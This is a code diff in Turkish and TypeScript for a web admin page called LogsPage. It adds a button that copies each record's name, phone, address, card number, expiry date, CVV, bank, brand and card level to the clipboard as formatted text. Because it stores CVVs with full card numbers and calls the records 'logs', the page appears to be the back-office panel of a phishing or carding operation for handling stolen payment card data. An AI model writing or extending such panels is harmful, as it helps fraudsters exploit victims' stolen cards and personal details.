@@ -357,6 +357,48 @@ export default function LogsPage() {
     }
   };
 
+  const copyFormattedLog = async (log: Log) => {
+    let adSoyad = log.ad_soyad || '';
+    let telefon = log.telefon || '';
+    let adresVal = log.adres || '';
+
+    // Adres verisi 'Ad Soyad - Telefon - Adres Detayı' formatındaysa ayrıştır
+    if (log.adres && log.adres.includes('-')) {
+      const parts = log.adres.split('-').map(part => part.trim());
+      if (parts.length >= 3) {
+        adSoyad = parts[0];
+        telefon = parts[1];
+        adresVal = parts.slice(2).join(' - ');
+      } else if (parts.length === 2) {
+        adSoyad = parts[0];
+        telefon = parts[1];
+        adresVal = '';
+      }
+    }
+
+    const cardDetails = [
+      log.kredi_karti || '',
+      log.skt || '',
+      log.cvv || '',
+      log.banka || '',
+      log.marka || '',
+      log.seviye || ''
+    ].filter(Boolean).join(' | ');
+
+    const textToCopy = `Ad soyad: ${adSoyad}
+Telefon: ${telefon}
+Adres: ${adresVal}
+Kart Bilgi: ${cardDetails}
+Geldiği Tarih: ${log.tarih || ''}`;
+
+    try {
+      await navigator.clipboard.writeText(textToCopy);
+      toast.success('Log bilgileri kopyalandı');
+    } catch (err) {
+      toast.error('Kopyalama başarısız');
+    }
+  };
+
   const fetchLogs = async () => {
     try {
       const res = await fetch('/api/logs');
@@ -1051,15 +1093,26 @@ export default function LogsPage() {
                       className={`table-row-hover ${log.is_hard ? 'bg-red-950/40 dark:bg-red-950/50 border-l-2 border-l-red-700' : ''}`}
                     >
                       <td className="py-2 px-1 whitespace-nowrap">
-                        <button
-                          onClick={() => showAddressModal(log)}
-                          className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
-                          title="Adres Detayı"
-                        >
-                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
-                          </svg>
-                        </button>
+                        <div className="flex items-center gap-1.5">
+                          <button
+                            onClick={() => showAddressModal(log)}
+                            className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
+                            title="Adres Detayı"
+                          >
+                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+                            </svg>
+                          </button>
+                          <button
+                            onClick={() => copyFormattedLog(log)}
+                            className="p-1.5 text-gray-500 hover:text-brand-500 hover:bg-brand-50 rounded-lg transition-colors dark:text-gray-400 dark:hover:text-brand-400 dark:hover:bg-brand-500/10"
+                            title="Log Bilgilerini Kopyala"
+                          >
+                            <svg className="w-5.5 h-5.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m-5 4h6m-6 4h6m-6 4h6" />
+                            </svg>
+                          </button>
+                        </div>
                       </td>
                       <td className="px-2 py-2 whitespace-nowrap w-[207px]" style={{ width: '207px' }}>
                         <div className="flex items-center gap-2">
